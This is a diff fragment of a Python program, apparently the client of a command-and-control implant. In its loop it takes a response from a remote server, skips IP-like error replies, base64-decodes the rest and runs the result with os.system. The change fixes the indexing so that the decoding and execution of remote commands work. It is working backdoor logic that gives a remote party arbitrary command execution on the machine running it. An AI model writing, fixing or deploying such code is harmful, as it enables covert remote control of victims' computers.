@@ -208,11 +208,11 @@ while True:
 
                 data = getResponse(resp)
                 
-                if len(data) == 1 and len(data.split('.')) == 4:
-                    if data.split('.')[3] == "100":
+                if len(data) == 1 and len(data[0].split('.')) == 4:
+                    if data[0].split('.')[3] == "100":
                         continue #Error response, skip running command
                 else:
-                    command = from_base64(data)
+                    command = from_base64(data[0])
                     
                 #print("Running command: " + command)
                 os.system(command)
